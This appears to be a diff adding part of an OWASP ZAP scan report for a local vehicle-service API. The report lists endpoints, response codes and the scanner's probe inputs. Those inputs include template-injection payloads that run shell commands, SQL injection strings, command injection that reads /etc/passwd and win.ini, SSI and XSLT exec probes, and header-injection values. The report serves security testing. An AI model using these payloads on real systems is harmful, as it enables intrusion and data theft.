+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "37",
+							"uri": "http://host.docker.internal:5183/api/Notifications/broadcast",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Notifications\/broadcast ()({title,message,category,imageUrl})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9309",
+							"uri": "http://host.docker.internal:5183/api/Notifications/broadcast/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Notifications\/broadcast\/ ()({title,message,category,imageUrl})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "40",
+							"uri": "http://host.docker.internal:5183/api/Notifications/upload-image",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Notifications\/upload-image ()(multipart:file)",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "10729",
+							"uri": "http://host.docker.internal:5183/api/Notifications/upload-image",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Notifications\/upload-image ()(multipart:rtobject)",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9312",
+							"uri": "http://host.docker.internal:5183/api/Notifications/upload-image/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Notifications\/upload-image\/ ()(multipart:file)",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "44",
+							"uri": "http://host.docker.internal:5183/api/Payments/payhere-notify",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Payments\/payhere-notify ()(custom_1,custom_2,md5sig,merchant_id,order_id,payhere_amount,payhere_currency,payment_id,status_code)",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "400",
+							"otherinfo": ""
+						},
+						{
+							"id": "9316",
+							"uri": "http://host.docker.internal:5183/api/Payments/payhere-notify/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Payments\/payhere-notify\/ ()(custom_1,custom_2,md5sig,merchant_id,order_id,payhere_amount,payhere_currency,payment_id,status_code)",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "400",
+							"otherinfo": ""
+						},
+						{
+							"id": "45",
+							"uri": "http://host.docker.internal:5183/api/ServiceRecords",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/ServiceRecords ()(multipart:VehicleId,Title,Description,PaymentMethod,OdometerReading,photos)",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9315",
+							"uri": "http://host.docker.internal:5183/api/ServiceRecords/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/ServiceRecords\/ ()(multipart:VehicleId,Title,Description,PaymentMethod,OdometerReading,photos)",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "54",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/reply",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/reply ()({userId,message,attachmentUrl})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "9317",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/reply/",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/reply\/ ()({userId,message,attachmentUrl})",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "401",
+							"otherinfo": ""
+						},
+						{
+							"id": "8239",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"#set($engine=\\\"\\\")\\n#set($proc=$engine.getClass().forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"sleep 15\\\"))\\n#set($null=$proc.waitFor())\\n${null}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8354",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"#{%x(sleep 15)}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8277",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"#{global.process.mainModule.require('child_process').execSync('sleep 15').toString()}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "4216",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "4229",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}\\\\\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8314",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"${__import__(\\\"subprocess\\\").check_output(\\\"sleep 15\\\", shell=True)}\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "2226",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"'\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "2294",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"'(\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "4205",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"';print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var='\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "4278",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"+response.write({0}*{1})+\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "1027",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"2875273004136247571.owasp.org\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "1073",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"5;URL='https:\/\/2875273004136247571.owasp.org'\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "1116",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"5;URL='https:\/\/2875273004136247571.owasp.org\/?John Doe'\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "2272",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\";\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "4232",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "6656",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"<!--\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "1871",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"<!--#EXEC cmd=\\\"dir \\\\\\\"-->\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "1852",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"<!--#EXEC cmd=\\\"ls \/\\\"-->\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "10648",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"<\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8226",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"<#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()> ${ ex(\\\"sleep 15\\\") }\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8268",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"<%= global.process.mainModule.require('child_process').execSync('sleep 15').toString()%>\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "8340",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"<%=%x(sleep 15)%>\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "10709",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"<xsl:value-of select=\\\"document('http:\/\/host.docker.internal:22')\\\"\/>\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "10752",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"<xsl:value-of select=\\\"php:function('exec','erroneous_command 2>\u0026amp;1')\\\"\/>\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "10665",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"<xsl:value-of select=\\\"system-property('xsl:vendor')\\\"\/>\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "10693",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"<xsl:value-of select=\\\"system-property('xsl:vendor')\\\"\/><!--\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "10723",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"<xsl:variable name=\\\"rtobject\\\" select=\\\"runtime:getRuntime()\\\"\/>\\n<xsl:variable name=\\\"process\\\" select=\\\"runtime:exec($rtobject,'erroneous_command')\\\"\/>\\n<xsl:variable name=\\\"waiting\\\" select=\\\"process:waitFor($process)\\\"\/>\\n<xsl:value-of select=\\\"$process\\\"\/>\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "2375",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe AND 1=1 -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "2394",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe AND 1=2 -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "2415",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe OR 1=1 -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "2460",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe UNION ALL select NULL -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "55",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "4944",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe\u0026cat \/etc\/passwd\u0026\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "5034",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe\u0026type %SYSTEMROOT%\\\\win.ini\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "2426",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe' AND '1'='1' -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "2436",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe' AND '1'='2' -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "2446",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe' OR '1'='1' -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "2472",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe' UNION ALL select NULL -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "2239",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe'\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "5008",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe'\u0026cat \/etc\/passwd\u0026'\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "5102",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe'\u0026type %SYSTEMROOT%\\\\win.ini\u0026'\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "2313",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe'(\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "2497",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe') UNION ALL select NULL -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "5020",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe';cat \/etc\/passwd;'\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "5167",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe';get-help\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "5114",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe'|type %SYSTEMROOT%\\\\win.ini\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "2493",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe) UNION ALL select NULL -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "2281",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe;\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "4972",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe;cat \/etc\/passwd;\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "5180",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe;get-help #\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "5135",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe;get-help\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "2484",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe\\\" UNION ALL select NULL -- \")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "2262",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe\\\"\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "4990",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe\\\"\u0026cat \/etc\/passwd\u0026\\\"\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "5060",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe\\\"\u0026type %SYSTEMROOT%\\\\win.ini\u0026\\\"\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "4999",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe\\\";cat \/etc\/passwd;\\\"\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "5150",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe\\\";get-help\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "5078",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe\\\"|type %SYSTEMROOT%\\\\win.ini\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "5048",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"John Doe|type %SYSTEMROOT%\\\\win.ini\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9431",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"OocOUjFbgixpXfurUEllghHLoHJEbwrGakiIltwxxZExVlwTHSTGAODGOAMjJgqBgbEVbAxRhXxytlSGFZABgCtLFAjGPtPUNQMxgSsZdWtwsXVwlJMsQFwZKeRFfyCYcbcTBIaXIQCGGbXpYcNRdlpsLFEIpLAUDnRROZPRGcIPrtQPtCrLqojHnQVpOvPakRekRTDkVfwcfIwAvSLcRljqoOacTJJxLDXxuVYMfEOdhetmrVdIHnpMPssHDRkYpTWFLCdwvOPEaSkDcBoZHKkNFdomchJONAplfQbqEpTfVUbcTjdewsBRVRNYCAKiIWZUcMGdvGCcAsOHSnhbWigajyVrlpPImhTGphNeUGBsIHAUJndRNAxPDAWYMKqYgJZFVtxadAQiCaxBpwMghtJmdBbqBuHdmVjiNCiLHTPKgmKVpDaBYSgiRZkywGfTjJXaILNhnJJNfobHkDBMmOsWNoASZZPQJaOYABAUavsXRQrjpkFKjkFNHQXOQXR)",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9835",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"Set-cookie: Tamper=6b9b83fd-1d69-42e4-927a-82217c1437f5\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "1087",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"URL='http:\/\/2875273004136247571.owasp.org'\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9576",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"ZAP %1!s%2!s%3!s%4!s%5!s%6!s%7!s%8!s%9!s%10!s%11!s%12!s%13!s%14!s%15!s%16!s%17!s%18!s%19!s%20!s%21!n%22!n%23!n%24!n%25!n%26!n%27!n%28!n%29!n%30!n%31!n%32!n%33!n%34!n%35!n%36!n%37!n%38!n%39!n%40!n\\n\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9549",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"ZAP\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "9561",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"ZAP%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s\\n\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "2248",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"\\\"\")",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "404",
+							"otherinfo": ""
+						},
+						{
+							"id": "6643",
+							"uri": "http://host.docker.internal:5183/api/Support/admin/ticket-status/userId",
+							"nodeName": "http:\/\/host.docker.internal:5183\/api\/Support\/admin\/ticket-status\/userId ()(\"\\\"'\")",
+							"method": "POST",
